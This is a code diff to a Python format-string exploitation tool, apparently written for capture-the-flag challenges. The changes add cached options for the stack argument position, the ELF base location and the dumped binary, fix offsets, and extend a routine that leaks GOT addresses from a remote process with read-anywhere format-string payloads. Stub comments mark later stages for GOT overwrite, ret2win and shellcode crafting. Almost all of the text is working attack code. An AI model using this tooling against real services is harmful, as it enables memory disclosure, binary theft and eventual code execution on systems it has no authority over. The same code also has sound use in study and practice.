@@ -108,6 +108,19 @@ class ffstr():
 			else:
 				self.rate_limit = 100
 				
+		# Format String stack argument recovering
+		if "STACKARG" in args.keys():
+			self.stack_arg = int(args.STACKARG)
+			
+		# ELF position
+		if "START" in args.keys():
+			i,guess = args.START.split(":")
+			self.start = (int(i),int(guess,16))
+			
+		# Reload DUMPED FILE
+		if "DUMPED" in args.keys():
+			self.dump_name = args.DUMPED
+				
 	def yesno(self):
 		# yes or no for further analysis
 		return input("Continue y/n :").strip().lower() == "y"
@@ -268,7 +281,14 @@ class ffstr():
 				if not self.yesno():
 					exit(1)
 	
+	# NEXT CMD LINE
+	
 	def checkfstr(self,txt):
+		
+		# Lazy 
+		if self.stack_arg is not None:
+			return
+			
 		# use regex to find the payload		
 		fmts = re.findall(self.re_ArgPattern, txt)
 		if fmts:
@@ -278,6 +298,7 @@ class ffstr():
 				end = fmt.find(b"$")
 				self.stack_arg = int(fmt[beg+1:end])
 				print("Stack Argument is in position "+str(self.stack_arg)+" ("+fmt.decode()+")")
+				print("Next time run with additional arg STACKARG="+str(self.stack_arg))
 					
 	def stackAnalyze(self):
 		
@@ -458,6 +479,10 @@ class ffstr():
 			print("Cannot Leak ...")
 			return
 		
+		# Lazy mode, don"t redo thing
+		if self.start is not None:
+			return
+			
 		print("Locating Binary ...")
 		
 		# Storing start file offset
@@ -501,8 +526,9 @@ class ffstr():
 				
 				# ELF Header
 				if data.find(b"\x7fELF") > -1:
-					self.start = (i ,guess) 
-					print(hex(leak),i,hex(guess),data)
+					self.start = (i+1 ,guess) 
+					print(hex(leak),i+1,hex(guess),data)
+					print("Next time use START="+str(i+1)+":"+hex(guess))
 					self.close()
 					return
 
@@ -514,8 +540,12 @@ class ffstr():
 			
 		
 	def dumpBinary(self):
-		# Dump Binary
+	
+		# Lazy mode, don't redo things
+		if self.dump_name is not None:
+			return
 		
+		# Dump Binary
 		print("Dumping Binary ...")
 		
 		# Binary
@@ -528,6 +558,8 @@ class ffstr():
 			
 		# Unique name for the dump binary
 		self.dump_name = str(int(time()))
+		print("Next time use DUMPED="+self.dump_name)
+		
 		
 		# Byte per Byte
 		n = 0
@@ -540,7 +572,7 @@ class ffstr():
 			# Leak an hexadecimal value
 			leak = None
 			while leak is None:
-				data = self.asyncExchange(self.stackPayload(i+1,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
@@ -594,31 +626,7 @@ class ffstr():
 					pwntool_not_happy = False
 				except:
 					self.elf = None
-			
-	def loadELF(self):
-		# leak libc adress
-		
-		# if we have access to the elf
-		if "ELF" in args.keys():
-			dumped = args["ELF"]
-		# unless scavenger way
-		else:
-			dumped = self.dump_name
-			
-		# Dump opening
-		with open(self.dump_name,"rb") as fp:
-			data = fp.read()
-			
-		# Strings	
-		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
-			
-		# Got address
-		got = [ elt[2:-1][::-1].hex() for elt in re.findall(b"\xff\x25....\x68", data)]
-			
-		print(strings)
-		print(got)
-		
-		
+
 	def showSymbols(self):
 		# Read binary symbols
 		
@@ -677,6 +685,64 @@ class ffstr():
 			# Close connexion
 			if not all(self.blind_behavior):
 				self.close()
+			
+	def loadELF(self):
+		# leak libc adress
+		
+		# if we have access to the elf
+		if "ELF" in args.keys():
+			dumped = args["ELF"]
+		# unless scavenger way
+		else:
+			dumped = self.dump_name
+			
+		# Dump opening
+		with open(self.dump_name,"rb") as fp:
+			data = fp.read()
+			
+		# Strings	
+		strings = [ elt[:-1] for elt in re.findall(b"([a-zA-Z0-9._-]{3,50}\x00)", data)]
+			
+		# Got address
+		got = [ elt[2:-1][::-1].hex() for elt in re.findall(b"\xff\x25....\x68", data)]
+			
+		print(strings)
+		print(got)
+		
+		for elt in got:
+		
+			# Get location
+			i , offset = self.start
+			
+			# Leak an hexadecimal value
+			leak = None
+			while leak is None:
+				data = self.asyncExchange(self.stackPayload(i,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+				regex = re.search(self.re_HexaPattern, data)
+				if regex:
+					leak = int(regex[0],16)
+						
+			# Read anywhere format string
+			pl = self.readAnywhere(int("0x"+elt,16),minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+			
+			# Get Data
+			data = b""
+			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
+				data += self.asyncExchange(pl)
+			left = data.find(self.delimiters[0])+len(self.delimiters[0])
+			right= data.find(self.delimiters[1])
+			dump =data[left:right]
+			print(dump[::-1].hex())
+			
+	# WRITE ANYWHERE
+	
+	# GOT OVERWRITE
+			
+	# RET2WIN
+	
+	# SHELLCRAFTING
+		
+
 
 def help():
 	print(
